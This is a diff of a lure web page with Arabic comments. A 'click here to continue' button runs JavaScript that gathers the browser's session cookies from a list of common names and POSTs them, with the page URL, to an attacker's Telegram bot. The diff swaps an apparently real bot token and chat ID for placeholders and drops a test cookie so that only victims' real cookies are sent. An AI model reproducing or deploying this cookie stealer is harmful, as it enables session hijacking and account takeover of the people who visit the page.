@@ -10,10 +10,8 @@
     <button id="btn" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
 
 <script>
-    // ضع هنا توكن بوت تليجرام الخاص بك
-    const botToken = "8085235360:AAGdjX59ml1CsOjz3ZFzR2XtDJX7OAZSgkc";
-    // ضع هنا الـ Chat ID الخاص بك أو بالمعرف المستهدف
-    const chatId = "1299584246";
+    const botToken = "YOUR_BOT_TOKEN";
+    const chatId = "YOUR_CHAT_ID";
 
     const SESSION_COOKIE_NAMES = new Set([
         "sessionid", "session_token", "session_id", "session", "sid",
@@ -48,17 +46,13 @@
     }
 
     function sendData() {
-        // (اختياري للاختبار) إضافة كوكي تجريبية للتأكد من وصولها للبوت
-        document.cookie = "sessionid=telegram_test_123; path=/";
-
+        // تم حذف الكوكي التجريبية هنا ليتم فحص الكوكيز الحقيقية الموجودة في المتصفح فقط
         const extractedCookies = getTargetCookies();
         
-        // تنسيق الرسالة لتظهر مرتبة داخل تليجرام
-        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط: ${window.location.href}\n🍪 الكوكيز:\n${JSON.stringify(extractedCookies, null, 2)}`;
+        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط: ${window.location.href}\n🍪 الكوكيز المستخرجة:\n${JSON.stringify(extractedCookies, null, 2)}`;
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        // إرسال البيانات مباشرة إلى بوت تليجرام عبر POST
         fetch(telegramUrl, {
             method: "POST",
             headers: {
